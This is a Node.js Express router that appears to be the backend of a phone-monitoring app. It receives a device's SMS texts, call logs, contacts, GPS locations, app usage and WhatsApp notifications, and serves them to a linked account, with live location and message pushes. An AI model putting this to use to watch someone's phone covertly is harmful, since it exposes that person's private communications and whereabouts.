const express = require('express');
const Sms = require('../models/Sms');
const Call = require('../models/Call');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const Device = require('../models/Device');
const AppUsage = require('../models/AppUsage');
const Notification = require('../models/Notification');

const router = express.Router();
const { requireUser } = require('../middleware/auth');

// helper: require device to exist and be associated to a user
async function requireRegisteredDevice(deviceId) {
  if (!deviceId) throw { status: 400, message: 'deviceId required' };
  const dev = await Device.findOne({ deviceId });
  if (!dev) throw { status: 403, message: 'device not registered' };
  if (!dev.user) throw { status: 403, message: 'device not associated to user' };
  return dev;
}

// POST /api/sms
router.post('/sms', async (req, res) => {
  try {
    const { deviceId, sender, message, timestamp } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new Sms({
      deviceId,
      user: dev.user,
      sender, message, timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();
    res.json({ ok: true });
  } catch (e) {
    console.error('sms err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/call
router.post('/call', async (req, res) => {
  try {
    const { deviceId, number, type, state, timestamp, duration } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new Call({
      deviceId,
      user: dev.user,
      number, type, state, timestamp: timestamp ? new Date(timestamp) : new Date(),
      duration: duration || 0
    });
    await doc.save();
    res.json({ ok: true, id: doc._id });
  } catch (e) {
    console.error('call err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/contacts (bulk)
router.post('/contacts', async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be array' });
    const userId = dev.user;
    const docs = contacts.map(c => ({ deviceId, user: userId, name: c.name || '', number: c.number || '' }));
    await Contact.insertMany(docs);
    res.json({ ok: true, inserted: docs.length });
  } catch (e) {
    console.error('contacts err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/location
router.post('/location', async (req, res) => {
  try {
    const { deviceId, lat, lon, accuracy, timestamp } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new Location({
      deviceId,
      user: dev.user,
      lat, lon, accuracy: accuracy || 0, timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();

    // emit socket to user
    const io = req.app.locals.io;
    if (io && doc.user) {
      io.to(`user:${String(doc.user)}`).emit('location:new', {
        _id: doc._id, deviceId: doc.deviceId, lat: doc.lat, lon: doc.lon, accuracy: doc.accuracy, timestamp: doc.timestamp
      });
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('location err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/app-usage
router.post('/app-usage', async (req, res) => {
  try {
    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new AppUsage({
      deviceId,
      user: dev.user,
      packageName, totalTime, lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
    });
    await doc.save();
    res.json({ ok: true });
  } catch (e) {
    console.error('app-usage err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/whatsapp (notifications)
router.post('/whatsapp', async (req, res) => {
  try {
    const { deviceId, message, timestamp, packageName, title } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const note = new Notification({
      deviceId,
      user: dev.user,
      packageName: packageName || 'unknown',
      title: title || '',
      message: message || '',
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await note.save();

    const io = req.app.locals.io;
    if (io && note.user) {
      io.to(`user:${String(note.user)}`).emit('notification:new', {
        _id: note._id, packageName: note.packageName, message: note.message, timestamp: note.timestamp, title: note.title
      });
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('whatsapp err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

/* ---------------------------
   GET endpoints (protected)
   --------------------------- */

const SmsModel = require('../models/Sms');
const CallModel = require('../models/Call');
const ContactModel = require('../models/Contact');
const LocationModel = require('../models/Location');
const MediaModel = require('../models/Media');
const AppUsageModel = require('../models/AppUsage');
const NotificationModel = require('../models/Notification');

router.get('/sms', requireUser, async (req, res) => {
  const docs = await SmsModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
  res.json(docs);
});

router.get('/call', requireUser, async (req, res) => {
  const docs = await CallModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
  res.json(docs);
});

router.get('/contacts', requireUser, async (req, res) => {
  const docs = await ContactModel.find({ user: req.user.id }).sort({ name: 1 }).limit(5000).lean();
  res.json(docs);
});

router.get('/location', requireUser, async (req, res) => {
  const docs = await LocationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(1000).lean();
  res.json(docs);
});

router.get('/whatsapp', requireUser, async (req, res) => {
  const docs = await NotificationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
  res.json(docs);
});

router.get('/app-usage', requireUser, async (req, res) => {
  const docs = await AppUsageModel.find({ user: req.user.id }).sort({ createdAt: -1 }).limit(500).lean();
  res.json(docs);
});

router.get('/media', requireUser, async (req, res) => {
  const docs = await MediaModel.find({ user: req.user.id }).sort({ uploadDate: -1 }).limit(500).lean();
  res.json(docs);
});

module.exports = router;
